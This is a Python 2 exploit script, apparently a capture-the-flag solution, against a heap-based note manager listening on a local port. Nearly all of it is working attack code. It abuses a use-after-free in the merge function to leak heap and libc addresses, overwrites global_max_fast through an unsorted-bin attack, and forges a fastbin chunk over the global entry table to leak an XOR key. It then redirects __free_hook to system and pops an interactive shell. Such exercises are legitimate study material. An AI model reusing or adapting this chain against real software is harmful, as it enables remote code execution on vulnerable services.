#!/usr/bin/python
import socket, struct, telnetlib


def sock(remoteip, remoteport):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((remoteip, remoteport))
    return s, s.makefile('rw', bufsize=0)


def read_until(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
      data += f.read(1)
    return data


def shell(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()


def p(a): return struct.pack("<I",a)
def u(a): return struct.unpack("<I",a)[0]
def p64(a): return struct.pack("<Q",a)
def u64(a): return struct.unpack("<Q",a)[0]


s, f = sock("127.0.0.1", 4088)

def insert(data):
    print '[+] insert'
    print read_until(f, 'choice: ')
    f.write('1\n')
    f.write('{}\n'.format(len(data) + 1))
    f.write('{}\n'.format(data))
    read_until(f, '==================\n')


def update(idx,data):
    print '[+] update'
    read_until(f, 'choice: ')
    f.write('2\n')
    f.write(str(idx) + '\n')
    f.write(str(len(data) + 1) + '\n')
    f.write(data + '\n')
    read_until(f, '==================\n')


def merge(from_, to):
    print '[+] merge from {} to {}'.format(str(from_), (to))
    read_until(f, 'choice: ')
    f.write('3\n')
    f.write(str(from_) + '\n')
    f.write(str(to) + '\n')
    read_until(f, '==================\n')


def delete(id):
    read_until(f, 'choice: ')
    f.write('4\n')
    f.write(str(id) + '\n')
    read_until(f, '==================\n')


def view(id):
    print '[+] view {}'.format(id)
    read_until(f, 'choice: ')
    f.write('5\n')
    f.write(str(id) + '\n')
    read_until(f, 'Entry No.{}:\n'.format(id))
    data = read_until(f)
    read_until(f, '==================\n')
    return data


def list():
    read_until(f, 'choice: ')
    f.write('6\n')
    read_until(f, '==================\n')


"""
typedef struct {
    int is_used;
    int size;
    char *enc_ptr;
}
"""


insert('A' * 8) # 0

insert('/bin/sh\0') # 0 1

# UAF1
insert('B' * 8) # 0 1 2

insert('C' * 8) # 0 1 2 3

# UAF2
insert('D' * 8) # 0 1 2 3 4

insert('E' * 0x90) # 0 1 2 3 4 5

delete(0) # 1 2 3 4 5

# UAF1
merge(2, 2) # 0 1 3 4 5
# At this point there are two chunks linked to unsorted bins

data = view(0)
heap_base = u64(data[:8]) - 0x0
libc_base = u64(data[8:16]) - 0x3c4b78

# TODO
global_entries = 0x555555554000 + 0x203060

free_hook = libc_base + 0x3c67a8
system = libc_base + 0x45390
global_max_fast = libc_base +  0x3c67f8

print '[+] heap_base = {}'.format(hex(heap_base))
print '[+] libc_base = {}'.format(hex(libc_base))
print '[+] global_max_fast = {}'.format(hex(global_max_fast))

# heap base chunk (entries[0].enc_ptr ^ key) is returned
insert('F' * 8) # 0 1 2 3 4 5

# Overwrite bk of a chunk left on unsorted bin
print '[+] Overwrite unsorted bin->bk'
update(0, 'G' * 8 + p64(global_max_fast - 0x10))
insert('H' * 8) # 0 1 2 3 4 5 6
print '[+] global_max_fast is now overwritten'

# UAF2
# Chunk of entries[4] will be linked to fastbins
merge(4, 4) # 0 1 2 3 5 6 7
print '[+] Chunk is now linked to fastbins'
# Overwrite fd of chunk linked to fastbins
# Point fd to &entries[5] so calloc will return it
update(7, p64(global_entries + 5 * 24))

# fastbins unlink attack
insert('I' * 8) # 0 1 2 3 4 5 6 7

# calloc here will return &entires[5] + 0x10
insert('J' * 79) # 0 1 2 3 4 5 6 7 8

# leak key
# view will show (entries[5] + 0x10) - (entries[8] + 0x24)
data = view(8).rstrip('\n')
xored = u64(data[-8:])
# ptr on entires[8] is pointing to entries[5] + 0x10
key = xored ^ (global_entries + 24 * 5 + 0x10) 
print '[+] key = {}'.format(hex(key))

# Overwrite entries[6].enc_ptr so it will point to __free_hook
buf = ''
buf += 'K' * 8
buf += p64(0x1)
buf += p64(0xa)
buf += p64(free_hook ^ key)
update(8, buf)

# Overwrite free_hook with system
update(6, p64(system))

f.write('4\n')
read_until(f, 'Entry ID: ')
f.write('1\n')

shell(s)
